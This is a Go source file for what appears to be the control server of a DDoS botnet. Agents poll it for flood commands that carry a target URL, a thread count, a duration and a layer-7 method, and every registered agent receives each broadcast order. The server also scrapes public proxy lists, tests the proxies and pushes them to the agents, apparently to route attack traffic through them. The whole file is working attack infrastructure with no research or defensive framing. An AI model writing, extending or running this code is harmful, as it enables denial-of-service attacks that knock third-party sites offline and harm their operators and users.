// control_server.go
package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ─── Models & Store ───────────────────────────────────────────────────────────

type Command struct {
	Action     string   `json:"action"`
	URL        string   `json:"url"`
	Threads    int      `json:"threads"`
	Timer      int      `json:"timer"`
	CustomHost string   `json:"custom_host"`
	Method     string   `json:"method"`
	Proxies    []string `json:"proxies,omitempty"`
}

type AgentStatus struct {
	Online   bool   `json:"Online"`
	Status   string `json:"Status"`
	LastPing string `json:"LastPing"`
}

type eventPayload struct {
	AgentID string
	Name    string
	Data    interface{}
}

// sseClient owns its send channel so the broker never writes to
// http.ResponseWriter from multiple goroutines.
type sseClient struct {
	id      string
	agentID string
	send    chan []byte // serialised SSE frames
}

const (
	sseClientBuf  = 64  // per-client channel depth
	maxQueueDepth = 100 // max pending commands per agent
	maxHistory    = 200 // max command history entries kept in memory
)

type Store struct {
	agents   map[string]bool
	agentsMu sync.Mutex

	pending map[string][]Command
	cmdsMu  sync.Mutex

	statuses map[string]*AgentStatus
	statusMu sync.RWMutex

	// keyed by agentID → slice of clients; "" means "all"
	sseByAgent map[string][]*sseClient
	sseMu      sync.Mutex

	history   []Command
	historyMu sync.Mutex
}

func NewStore() *Store {
	return &Store{
		agents:     make(map[string]bool),
		pending:    make(map[string][]Command),
		statuses:   make(map[string]*AgentStatus),
		sseByAgent: make(map[string][]*sseClient),
		history:    make([]Command, 0),
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(v); err != nil {
		slog.Error("writeJSON failed", "err", err)
	}
}

func methodNotAllowed(w http.ResponseWriter) {
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

// authMiddleware checks a shared secret in the Authorization header.
// Set SERVER_TOKEN env var before starting; skip check when it is empty
// (useful in local dev without any env var set).
func authMiddleware(token string, next http.HandlerFunc) http.HandlerFunc {
	if token == "" {
		return next // no token configured → open (dev mode)
	}
	return func(w http.ResponseWriter, r *http.Request) {
		got := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		if got != token {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// validateURL ensures the target is a well-formed http/https URL.
func validateURL(raw string) error {
	u, err := url.ParseRequestURI(raw)
	if err != nil {
		return fmt.Errorf("malformed URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("URL scheme must be http or https, got %q", u.Scheme)
	}
	return nil
}

// ─── SSE Management ──────────────────────────────────────────────────────────

func (s *Store) addClient(c *sseClient) {
	s.sseMu.Lock()
	s.sseByAgent[c.agentID] = append(s.sseByAgent[c.agentID], c)
	s.sseMu.Unlock()
}

func (s *Store) removeClient(c *sseClient) {
	s.sseMu.Lock()
	clients := s.sseByAgent[c.agentID]
	for i, cl := range clients {
		if cl.id == c.id {
			s.sseByAgent[c.agentID] = append(clients[:i], clients[i+1:]...)
			break
		}
	}
	s.sseMu.Unlock()
}

// collectTargets returns a snapshot of clients that should receive ev.
// O(1) per matching bucket; no full scan.
func (s *Store) collectTargets(ev eventPayload) []*sseClient {
	s.sseMu.Lock()
	defer s.sseMu.Unlock()

	var out []*sseClient
	switch ev.Name {
	case "command-enqueued":
		// Route to the agent's own listeners OR the dashboard wildcard (""),
		// never both — the dashboard gets its own dedicated wildcard event.
		out = append(out, s.sseByAgent[ev.AgentID]...)
	case "agent-status-changed":
		// agent-specific listeners + wildcard listeners (agentID == "")
		out = append(out, s.sseByAgent[ev.AgentID]...)
		out = append(out, s.sseByAgent[""]...)
	}
	return out
}

func (s *Store) sseHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}

	fl, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	agentID := r.URL.Query().Get("agentID") // "" means "all agents"
	clientID := agentID + "_" + strconv.FormatInt(time.Now().UnixNano(), 10)
	client := &sseClient{
		id:      clientID,
		agentID: agentID,
		send:    make(chan []byte, sseClientBuf),
	}
	s.addClient(client)
	defer s.removeClient(client)

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	// initial handshake
	fmt.Fprintf(w, ": connected\n\nretry: 2000\n\n")
	fl.Flush()

	pingTicker := time.NewTicker(5 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-r.Context().Done():
			return
		case frame, ok := <-client.send:
			if !ok {
				return
			}
			if _, err := w.Write(frame); err != nil {
				return
			}
			fl.Flush()
		case <-pingTicker.C:
			if _, err := fmt.Fprintf(w, ": ping\n\n"); err != nil {
				return
			}
			fl.Flush()
		}
	}
}

// runSSEBroker fans out events to clients via per-client channels,
// so it never blocks on a slow HTTP writer.
func (s *Store) runSSEBroker(ctx context.Context, events <-chan eventPayload) {
	for {
		select {
		case <-ctx.Done():
			return
		case ev, ok := <-events:
			if !ok {
				return
			}
			targets := s.collectTargets(ev)
			if len(targets) == 0 {
				continue
			}

			var frame []byte
			switch ev.Name {
			case "command-enqueued":
				raw, _ := json.Marshal(ev.Data)
				frame = []byte(fmt.Sprintf("event: %s\ndata: %s\n\n", ev.Name, raw))
			case "agent-status-changed":
				payload := map[string]interface{}{
					"agentID": ev.AgentID,
					"status":  ev.Data,
				}
				raw, _ := json.Marshal(payload)
				frame = []byte(fmt.Sprintf("event: %s\ndata: %s\n\n", ev.Name, raw))
			}

			for _, c := range targets {
				select {
				case c.send <- frame:
				default:
					// client too slow; drop frame rather than block the broker
					slog.Warn("SSE client too slow, dropping frame", "clientID", c.id)
				}
			}
		}
	}
}

// ─── Offline Watcher ─────────────────────────────────────────────────────────

func (s *Store) runOfflineWatcher(ctx context.Context, timeout time.Duration, events chan<- eventPayload) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case now := <-ticker.C:
			cutoff := now.UTC().Add(-timeout)
			var toOffline []string

			// collect candidates under read lock
			s.statusMu.RLock()
			for id, st := range s.statuses {
				last, err := time.Parse(time.RFC3339, st.LastPing)
				if err == nil && st.Online && last.Before(cutoff) {
					toOffline = append(toOffline, id)
				}
			}
			s.statusMu.RUnlock()

			// re-check + mutate under write lock to close TOCTOU window
			for _, id := range toOffline {
				s.statusMu.Lock()
				st := s.statuses[id]
				// re-check: another goroutine may have updated it
				last, err := time.Parse(time.RFC3339, st.LastPing)
				if err == nil && st.Online && last.Before(cutoff) {
					st.Online = false
					st.Status = ""
					snapshot := *st
					s.statusMu.Unlock()

					events <- eventPayload{AgentID: id, Name: "agent-status-changed", Data: snapshot}
					slog.Info("marked agent offline", "agentID", id)
				} else {
					s.statusMu.Unlock()
				}
			}
		}
	}
}

// ─── HTTP Handlers ───────────────────────────────────────────────────────────

func (s *Store) handleCommand(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}
		if err := r.ParseForm(); err != nil {
			http.Error(w, "invalid form data", http.StatusBadRequest)
			return
		}

		action := r.FormValue("action")
		if action == "" {
			action = "start"
		}

		var cmd Command
		if action == "stop" {
			cmd = Command{Action: "stop"}
		} else {
			threadsStr := r.FormValue("threads")
			if threadsStr == "" {
				threadsStr = "64"
			}
			threads, err1 := strconv.Atoi(threadsStr)

			timerStr := r.FormValue("timer")
			if timerStr == "" {
				timerStr = "60"
			}
			timer, err2 := strconv.Atoi(timerStr)
			if err1 != nil || err2 != nil {
				http.Error(w, "invalid numeric parameter", http.StatusBadRequest)
				return
			}
			if threads <= 0 || timer <= 0 {
				http.Error(w, "threads and timer must be positive", http.StatusBadRequest)
				return
			}

			rawURL := strings.TrimSpace(r.FormValue("url"))
			if err := validateURL(rawURL); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}

			method := r.FormValue("method")
			if method != "l7p" {
				method = "l7"
			}

			cmd = Command{
				Action:     "start",
				URL:        rawURL,
				Threads:    threads,
				Timer:      timer,
				CustomHost: r.FormValue("custom_host"),
				Method:     method,
			}
		}

		// Only persist actionable commands to history (skip stop).
		if cmd.Action != "stop" {
			s.historyMu.Lock()
			s.history = append([]Command{cmd}, s.history...)
			if len(s.history) > maxHistory {
				s.history = s.history[:maxHistory]
			}
			s.historyMu.Unlock()
		}

		// Snapshot agent IDs under agentsMu, then enqueue under cmdsMu separately
		// to avoid nested locking (agentsMu → cmdsMu) which risks deadlock.
		s.agentsMu.Lock()
		agentIDs := make([]string, 0, len(s.agents))
		for id := range s.agents {
			agentIDs = append(agentIDs, id)
		}
		s.agentsMu.Unlock()

		var evs []eventPayload
		s.cmdsMu.Lock()
		for _, id := range agentIDs {
			if len(s.pending[id]) >= maxQueueDepth {
				slog.Warn("queue full, dropping command", "agentID", id)
				continue
			}
			s.pending[id] = append(s.pending[id], cmd)
			evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
		}
		s.cmdsMu.Unlock()

		go func() {
			for _, ev := range evs {
				select {
				case events <- ev:
				default:
					slog.Warn("event channel full, dropping", "agentID", ev.AgentID)
				}
				slog.Info("enqueued command", "agentID", ev.AgentID, "url", cmd.URL, "threads", cmd.Threads)
			}
			// One dedicated event for the dashboard (wildcard agentID "").
			if len(evs) > 0 {
				select {
				case events <- eventPayload{AgentID: "", Name: "command-enqueued", Data: cmd}:
				default:
				}
			}
		}()

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}

func (s *Store) agentPollHandler(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			methodNotAllowed(w)
			return
		}

		agentID := r.URL.Query().Get("agentID")
		if agentID == "" {
			http.Error(w, "agentID required", http.StatusBadRequest)
			return
		}

		now := time.Now().UTC().Format(time.RFC3339)
		isNew := false

		s.agentsMu.Lock()
		if !s.agents[agentID] {
			s.agents[agentID] = true
			isNew = true
		}
		s.agentsMu.Unlock()

		s.statusMu.Lock()
		var st *AgentStatus
		if existing, ok := s.statuses[agentID]; ok {
			existing.Online = true
			existing.LastPing = now
			st = existing
		} else {
			st = &AgentStatus{Online: true, Status: "Ready", LastPing: now}
			s.statuses[agentID] = st
		}
		snapshot := *st
		s.statusMu.Unlock()

		// emit status event for brand-new agents so the dashboard updates immediately
		if isNew {
			go func() {
				events <- eventPayload{AgentID: agentID, Name: "agent-status-changed", Data: snapshot}
			}()
			slog.Info("new agent registered", "agentID", agentID)
		}

		s.cmdsMu.Lock()
		queue := s.pending[agentID]
		if len(queue) > 0 {
			cmd := queue[0]
			s.pending[agentID] = queue[1:]
			s.cmdsMu.Unlock()
			writeJSON(w, cmd)
			slog.Info("dispatched command to agent", "agentID", agentID, "action", cmd.Action)
			return
		}
		s.cmdsMu.Unlock()

		writeJSON(w, Command{Action: "none"})
	}
}

func (s *Store) agentStatusHandler(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}

		var p struct {
			AgentID string `json:"agentID"`
			Status  string `json:"status"`
		}
		// Limit body to 1 MB to prevent abuse.
		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&p); err != nil {
			http.Error(w, "invalid JSON", http.StatusBadRequest)
			return
		}
		if p.AgentID == "" {
			http.Error(w, "agentID required", http.StatusBadRequest)
			return
		}

		now := time.Now().UTC().Format(time.RFC3339)

		s.agentsMu.Lock()
		s.agents[p.AgentID] = true
		s.agentsMu.Unlock()

		s.statusMu.Lock()
		st, ok := s.statuses[p.AgentID]
		if !ok {
			st = &AgentStatus{}
			s.statuses[p.AgentID] = st
		}
		st.Online = true
		st.Status = p.Status
		st.LastPing = now
		snapshot := *st
		s.statusMu.Unlock()

		// Non-blocking send to avoid stalling the HTTP handler if the channel is full.
		select {
		case events <- eventPayload{AgentID: p.AgentID, Name: "agent-status-changed", Data: snapshot}:
		default:
			slog.Warn("event channel full, dropping status event", "agentID", p.AgentID)
		}
		w.WriteHeader(http.StatusOK)
	}
}

func (s *Store) listAgentStatuses(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}

	s.statusMu.RLock()
	defer s.statusMu.RUnlock()

	out := make(map[string]AgentStatus, len(s.statuses))
	for id, st := range s.statuses {
		if !st.Online {
			out[id] = AgentStatus{Online: false, Status: "", LastPing: st.LastPing}
		} else {
			out[id] = *st
		}
	}
	writeJSON(w, out)
}

func (s *Store) listCommandHistory(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}
	s.historyMu.Lock()
	out := make([]Command, len(s.history))
	copy(out, s.history)
	s.historyMu.Unlock()
	writeJSON(w, out)
}

func renderInterface(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	http.ServeFile(w, r, "Interface/index.html")
}

// ─── Proxy Scraper ────────────────────────────────────────────────────────────

// proxySourcesByProtocol maps protocol name → list of raw-text proxy sources.
var proxySourcesByProtocol = map[string][]string{
	"http": {
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
	},
	"https": {
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
	},
	"socks4": {
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
	},
	"socks5": {
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
	},
}

var proxyFetchClient = &http.Client{Timeout: 20 * time.Second}

func scrapeProxiesHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}

	protocol := r.URL.Query().Get("protocol")
	if protocol == "" {
		protocol = "http"
	}
	sources, ok := proxySourcesByProtocol[protocol]
	if !ok {
		http.Error(w, "unknown protocol", http.StatusBadRequest)
		return
	}

	type fetchResult struct {
		proxies []string
		source  string
		err     error
	}

	ch := make(chan fetchResult, len(sources))
	for _, src := range sources {
		src := src
		go func() {
			resp, err := proxyFetchClient.Get(src)
			if err != nil {
				ch <- fetchResult{source: src, err: err}
				return
			}
			defer resp.Body.Close()
			body, err := io.ReadAll(io.LimitReader(resp.Body, 5<<20))
			if err != nil {
				ch <- fetchResult{source: src, err: err}
				return
			}
			var proxies []string
			for _, line := range strings.Split(string(body), "\n") {
				line = strings.TrimSpace(line)
				if line == "" || strings.HasPrefix(line, "#") {
					continue
				}
				if strings.Contains(line, ":") {
					proxies = append(proxies, line)
				}
			}
			ch <- fetchResult{source: src, proxies: proxies}
		}()
	}

	seen := make(map[string]struct{})
	var all []string
	for range sources {
		res := <-ch
		if res.err != nil {
			slog.Warn("proxy source failed", "source", res.source, "err", res.err)
			continue
		}
		for _, p := range res.proxies {
			if _, ok := seen[p]; !ok {
				seen[p] = struct{}{}
				all = append(all, p)
			}
		}
		slog.Info("proxy source scraped", "source", res.source, "count", len(res.proxies))
	}

	if all == nil {
		all = []string{}
	}
	writeJSON(w, map[string]interface{}{
		"proxies":  all,
		"count":    len(all),
		"protocol": protocol,
	})
}

// testProxiesHandler tests each proxy via TCP dial and returns only
// those that accept a connection within the specified timeout.
// Up to 100 concurrent dials.
func testProxiesHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		methodNotAllowed(w)
		return
	}

	var body struct {
		Proxies   []string `json:"proxies"`
		TimeoutMs int      `json:"timeout_ms"`
	}
	// Limit body to 10 MB to prevent abuse (proxy lists can be large).
	if err := json.NewDecoder(io.LimitReader(r.Body, 10<<20)).Decode(&body); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}
	if len(body.Proxies) == 0 {
		writeJSON(w, map[string]interface{}{"working": []interface{}{}, "count": 0})
		return
	}

	timeoutMs := body.TimeoutMs
	if timeoutMs <= 0 {
		timeoutMs = 3000
	}
	timeout := time.Duration(timeoutMs) * time.Millisecond

	type result struct {
		proxy   string
		working bool
		latency int64
	}

	sem := make(chan struct{}, 100) // max 100 concurrent dials
	ch := make(chan result, len(body.Proxies))

	for _, proxy := range body.Proxies {
		go func(p string) {
			sem <- struct{}{}
			defer func() { <-sem }()

			start := time.Now()
			conn, err := net.DialTimeout("tcp", p, timeout)
			latency := time.Since(start).Milliseconds()

			if err != nil {
				ch <- result{proxy: p, working: false}
				return
			}
			conn.Close()
			ch <- result{proxy: p, working: true, latency: latency}
		}(proxy)
	}

	type WorkingProxy struct {
		Proxy   string `json:"proxy"`
		Latency int64  `json:"latency"`
	}
	working := make([]WorkingProxy, 0)
	for range body.Proxies {
		res := <-ch
		if res.working {
			working = append(working, WorkingProxy{Proxy: res.proxy, Latency: res.latency})
		}
	}

	slog.Info("proxy test complete", "total", len(body.Proxies), "working", len(working))
	writeJSON(w, map[string]interface{}{
		"working": working,
		"count":   len(working),
	})
}

func (s *Store) broadcastProxiesHandler(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}
		var body struct {
			Proxies []string `json:"proxies"`
		}
		// Limit body to 10 MB.
		if err := json.NewDecoder(io.LimitReader(r.Body, 10<<20)).Decode(&body); err != nil {
			http.Error(w, "invalid JSON", http.StatusBadRequest)
			return
		}

		cmd := Command{
			Action:  "update_proxies",
			Proxies: body.Proxies,
		}

		// Snapshot agent IDs to avoid nested locking.
		s.agentsMu.Lock()
		agentIDs := make([]string, 0, len(s.agents))
		for id := range s.agents {
			agentIDs = append(agentIDs, id)
		}
		s.agentsMu.Unlock()

		var evs []eventPayload
		s.cmdsMu.Lock()
		for _, id := range agentIDs {
			if len(s.pending[id]) < maxQueueDepth {
				s.pending[id] = append(s.pending[id], cmd)
				evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
			}
		}
		s.cmdsMu.Unlock()

		go func() {
			for _, ev := range evs {
				select {
				case events <- ev:
				default:
				}
			}
			if len(evs) > 0 {
				select {
				case events <- eventPayload{AgentID: "", Name: "command-enqueued", Data: cmd}:
				default:
				}
			}
		}()

		slog.Info("broadcasted proxies to agents", "count", len(body.Proxies), "agents", len(evs))
		writeJSON(w, map[string]string{"status": "ok"})
	}
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
	addr := flag.String("addr", ":8081", "listen address")
	offlineTO := flag.Duration("offline-timeout", 3*time.Second, "time before an agent is marked offline")
	flag.Parse()

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelInfo}))
	slog.SetDefault(logger)
	slog.Info("starting control server", "addr", *addr)

	token := os.Getenv("SERVER_TOKEN")
	if token == "" {
		slog.Warn("SERVER_TOKEN not set — running without authentication")
	}

	store := NewStore()
	events := make(chan eventPayload, 1000)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	var wg sync.WaitGroup

	wg.Add(1)
	go func() {
		defer wg.Done()
		store.runSSEBroker(ctx, events)
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		store.runOfflineWatcher(ctx, *offlineTO, events)
	}()

	mux := http.NewServeMux()
	mux.Handle("/Interface/", http.StripPrefix("/Interface/", http.FileServer(http.Dir("Interface"))))
	mux.HandleFunc("/events", authMiddleware(token, store.sseHandler))
	mux.HandleFunc("/command", authMiddleware(token, store.handleCommand(events)))
	mux.HandleFunc("/poll-agent", authMiddleware(token, store.agentPollHandler(events)))
	mux.HandleFunc("/agent-status", authMiddleware(token, store.agentStatusHandler(events)))
	mux.HandleFunc("/agent-statuses", authMiddleware(token, store.listAgentStatuses))
	mux.HandleFunc("/command-history", authMiddleware(token, store.listCommandHistory))
	mux.HandleFunc("/scrape-proxies", authMiddleware(token, scrapeProxiesHandler))
	mux.HandleFunc("/test-proxies", authMiddleware(token, testProxiesHandler))
	mux.HandleFunc("/broadcast-proxies", authMiddleware(token, store.broadcastProxiesHandler(events)))
	mux.HandleFunc("/", renderInterface)

	srv := &http.Server{
		Addr:    *addr,
		Handler: mux,
		// ReadTimeout intentionally omitted on the SSE + long-poll paths;
		// set it only on non-streaming endpoints via per-handler logic if needed.
		WriteTimeout: 0,
		IdleTimeout:  60 * time.Second,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}

	go func() {
		<-ctx.Done()
		slog.Info("shutting down")
		shCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := srv.Shutdown(shCtx); err != nil {
			slog.Error("shutdown error", "err", err)
		}
		close(events) // signal broker & watcher to exit
	}()

	slog.Info("listening", "addr", *addr)
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		slog.Error("ListenAndServe failed", "err", err)
		os.Exit(1)
	}

	wg.Wait()
	slog.Info("stopped")
}
